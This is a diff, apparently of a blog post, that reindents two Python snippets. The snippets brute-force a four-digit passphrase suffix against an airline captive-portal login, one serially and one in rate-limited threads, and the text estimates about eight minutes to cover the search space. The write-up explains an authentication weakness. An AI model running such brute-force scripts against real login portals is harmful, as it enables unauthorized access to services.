@@ -98,16 +98,16 @@ I could write a quick wrapper to the request such that it would try all combinat
 
 ```python
 for i in range(10000):
-	attempt = "%04d" % i # h/t /u/paulschreiber
-	data = {
-	  'user': 'WORLDWIDE' + attempt,
-	  'password': 'NULL',
-	  'cmd': 'authenticate',
-	  'Login': 'Sign in'
-	}
-	response = requests.post('https://anairline.com/auth/index.html/u', headers=headers, cookies=cookies, data=data)
-	if response.status_code != 302:
-		print('Valid passphrase found: WORLDWIDE%s' % attempt)
+    attempt = "%04d" % i # h/t /u/paulschreiber
+    data = {
+      'user': 'WORLDWIDE' + attempt,
+      'password': 'NULL',
+      'cmd': 'authenticate',
+      'Login': 'Sign in'
+    }
+    response = requests.post('https://anairline.com/auth/index.html/u', headers=headers, cookies=cookies, data=data)
+    if response.status_code != 302:
+        print('Valid passphrase found: WORLDWIDE%s' % attempt)
 ```
 
 Unfortunately this was pretty slow - it would serialize the attempts, which would not allow an attempt to be made until the previous network request had returned. A little threading magic (and ratelimiting) and we'd be on our way.
@@ -117,20 +117,20 @@ import threading
 import time
 
 def brute_force_pass(attempt):
-	data = {
-	  'user': 'WORLDWIDE' + attempt,
-	  'password': 'NULL',
-	  'cmd': 'authenticate',
-	  'Login': 'Sign in'
-	}
-	response = requests.post('https://anairline.com/auth/index.html/u', headers=headers, cookies=cookies, data=data)
-	if response.status_code != 302:
-		print('Valid passphrase found: WORLDWIDE%s' % attempt)
+    data = {
+      'user': 'WORLDWIDE' + attempt,
+      'password': 'NULL',
+      'cmd': 'authenticate',
+      'Login': 'Sign in'
+    }
+    response = requests.post('https://anairline.com/auth/index.html/u', headers=headers, cookies=cookies, data=data)
+    if response.status_code != 302:
+        print('Valid passphrase found: WORLDWIDE%s' % attempt)
 
 for i in range(10000):
-	attempt = "%04d" % i # h/t /u/paulschreiber
-	threading.Thread(target=brute_force_pass, args=[attempt]).start()
-	time.sleep(0.05) # sleep for 1/20th of a second so we don't start timing out or running out of sockets
+    attempt = "%04d" % i # h/t /u/paulschreiber
+    threading.Thread(target=brute_force_pass, args=[attempt]).start()
+    time.sleep(0.05) # sleep for 1/20th of a second so we don't start timing out or running out of sockets
 ```
 
 Fortunately the captive portal is running locally so the RTT is pretty low, which means that the server replies fairly quickly. At `0.05` seconds (plus overhead) per request we should be able to try the entire search space in just over 8 minutes. 
